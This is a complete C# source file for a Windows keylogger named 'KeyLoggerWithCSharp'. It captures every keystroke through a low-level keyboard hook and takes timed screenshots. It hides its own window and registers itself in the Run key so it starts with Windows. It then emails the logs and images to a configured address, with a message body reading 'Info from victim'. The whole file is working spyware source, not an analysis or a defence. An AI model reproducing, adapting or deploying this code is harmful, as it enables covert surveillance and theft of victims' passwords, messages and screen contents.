using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLoggerWithCSharp
{
   public class Program
   {
      #region My Custom config

      private static string LogFileName { get => "Log_" + DateTime.Today.ToString("dd.MM.yyyy") + ".txt"; }
      private static string ImageDirectoryPath { get => "Image" + DateTime.Now.ToString("dd.MM.yyyy"); }
      private static string ImageFileName { get => Path.Combine(ImageDirectoryPath, DateTime.Now.ToString("HH.mm.ss.ffff") + ".png"); }

      private static int captureTime;    // in milisecond
      private static int mailTime;       // in milisecond
      private static string sendEmailAddress;
      private static string sendEmailPassword;
      private static string receiveEmailAddress;

      #endregion My Custom config

      #region hook key board

      private const int WH_KEYBOARD_LL = 13;
      private const int WM_KEYDOWN = 0x0100;

      private static readonly LowLevelKeyboardProc _proc = HookCallback;
      private static IntPtr _hookID = IntPtr.Zero;

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      [return: MarshalAs(UnmanagedType.Bool)]
      private static extern bool UnhookWindowsHookEx(IntPtr hhk);

      [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

      [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
      private static extern IntPtr GetModuleHandle(string lpModuleName);

      /// <summary>
      /// Delegate a LowLevelKeyboardProc to use user32.dll
      /// </summary>
      /// <param name="nCode"></param>
      /// <param name="wParam"></param>
      /// <param name="lParam"></param>
      /// <returns></returns>
      private delegate IntPtr LowLevelKeyboardProc(
      int nCode, IntPtr wParam, IntPtr lParam);

      /// <summary>
      /// Set hook into all current process
      /// </summary>
      /// <param name="proc"></param>
      /// <returns></returns>
      private static IntPtr SetHook(LowLevelKeyboardProc proc)
      {
         using (Process curProcess = Process.GetCurrentProcess())
         {
            using (ProcessModule curModule = curProcess.MainModule)
            {
               return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
         }
      }

      /// <summary>
      /// Every time the OS call back pressed key. Catch them
      /// then cal the CallNextHookEx to wait for the next key
      /// </summary>
      /// <param name="nCode"></param>
      /// <param name="wParam"></param>
      /// <param name="lParam"></param>
      /// <returns></returns>
      private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
      {
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
            int vkCode = Marshal.ReadInt32(lParam);

            CheckHotKey(vkCode);
            WriteLog(vkCode);
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
      }

      /// <summary>
      /// Write pressed key into log.txt file
      /// </summary>
      /// <param name="vkCode"></param>
      private static void WriteLog(int vkCode)
      {
         Console.WriteLine((Keys)vkCode);
         StreamWriter sw = new StreamWriter(LogFileName, true);
         sw.Write((Keys)vkCode);
         sw.Close();
      }

      /// <summary>
      /// Start hook key board and hide the key logger
      /// Key logger only show again if pressed right Hot key
      /// </summary>
      private static void HookKeyboard()
      {
         _hookID = SetHook(_proc);
         Application.Run();
         UnhookWindowsHookEx(_hookID);
      }

      private static bool isHotKey = false;
      private static bool isShowing = false;
      private static Keys previoursKey = Keys.Separator;

      private static void CheckHotKey(int vkCode)
      {
         if ((previoursKey == Keys.LControlKey || previoursKey == Keys.RControlKey) && (Keys)(vkCode) == Keys.K)
            isHotKey = true;

         if (isHotKey)
         {
            if (!isShowing)
            {
               DisplayWindow();
            }
            else
            {
               HideWindow();
            }
            isShowing = !isShowing;
         }

         previoursKey = (Keys)vkCode;
         isHotKey = false;
      }

      #endregion hook key board

      /// <summary>
      /// Capture al screen then save into ImageFileName
      /// </summary>
      private static void CaptureScreen()
      {
         //Create a new bitmap.
         var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                        Screen.PrimaryScreen.Bounds.Height,
                                        PixelFormat.Format32bppArgb);

         // Create a graphics object from the bitmap.
         var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

         // Take the screenshot from the upper left corner to the right bottom corner.
         gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                      Screen.PrimaryScreen.Bounds.Y,
                                      0,
                                      0,
                                      Screen.PrimaryScreen.Bounds.Size,
                                      CopyPixelOperation.SourceCopy);

         if (!Directory.Exists(ImageDirectoryPath)) { Directory.CreateDirectory(ImageDirectoryPath); }

         try
         {
            bmpScreenshot.Save(ImageFileName, ImageFormat.Png);
         }
         catch (Exception e)
         {
            Console.WriteLine("Error while capture screen:\n{0}", e.Message);
         }
      }

      private static void StartTimmer()
      {
         int interval = 0;
         int maxInterval = captureTime * mailTime;

         Thread thread = new Thread(() =>
         {
            while (true)
            {
               Thread.Sleep(1);

               if (interval % captureTime == 0) { CaptureScreen(); }
               if (interval % mailTime == 0) { SendMail(); }

               interval = interval > maxInterval ? 0 : interval + 1;
            }
         })
         { IsBackground = true };
         thread.Start();
      }

      #region Windows

      [DllImport("kernel32.dll")]
      private static extern IntPtr GetConsoleWindow();

      [DllImport("user32.dll")]
      private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

      private const int SW_HIDE = 0;  // hide window code
      private const int SW_SHOW = 5;  // show window code

      private static void HideWindow() => ShowWindow(GetConsoleWindow(), SW_HIDE);

      private static void DisplayWindow() => ShowWindow(GetConsoleWindow(), SW_SHOW);

      #endregion Windows

      #region Registry that open with window

      private static void StartWithOS()
      {
         RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
         RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
         string keyvalue = "1";
         try
         {
            regkey.SetValue("Index", keyvalue);
            regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
            regkey.Close();
         }
         catch (Exception ex)
         {
            Console.WriteLine("Error while add registry\n{0}", ex.Message);
         }
      }

      #endregion Registry that open with window

      private static void SendMail()
      {
         try
         {
            MailMessage mail = new MailMessage(sendEmailAddress, receiveEmailAddress)
            {
               Subject = "Key Logger " + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"),
               Body = "Info from victim\n",
            };

            if (File.Exists(LogFileName))
            {
               StreamReader sr = new StreamReader(LogFileName);
               mail.Body += sr.ReadToEnd();
               sr.Close();
            }

            DirectoryInfo image = new DirectoryInfo(ImageDirectoryPath);

            foreach (FileInfo item in image.GetFiles("*.png"))
            {
               if (File.Exists(ImageDirectoryPath + "\\" + item.Name))
               {
                  mail.Attachments.Add(new Attachment(ImageDirectoryPath + "\\" + item.Name));
               }
            }

            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)
            {
               Credentials = new System.Net.NetworkCredential(sendEmailAddress, sendEmailPassword),
               EnableSsl = true
            };
            smtpClient.Send(mail);

            Console.WriteLine("Send mail!");
            // phải làm cái này ở mail dùng để gửi phải bật lên
            // https://www.google.com/settings/u/1/security/lesssecureapps
         }
         catch (Exception ex) { Console.WriteLine("Error\n{0}", ex.Message); }
      }

      private static void LoadConfig()
      {
         IniFile iniFile = new IniFile("config.ini", "Config");
         int.TryParse(iniFile.Read("captureTime"), out captureTime);
         int.TryParse(iniFile.Read("mailTime"), out mailTime);

         //set default value if parse error
         captureTime = (captureTime < 0) ? 1000 : captureTime;
         mailTime = (mailTime < 0) ? 1000 : mailTime;

         sendEmailAddress = iniFile.Read("sendEmailAddress");
         sendEmailPassword = iniFile.Read("sendEmailPassword");
         receiveEmailAddress = iniFile.Read("receiveEmailAddress");
      }

      private static void Main(string[] args)
      {
         LoadConfig();

         StartWithOS();
         HideWindow();

         StartTimmer();
         HookKeyboard();
      }
   }
}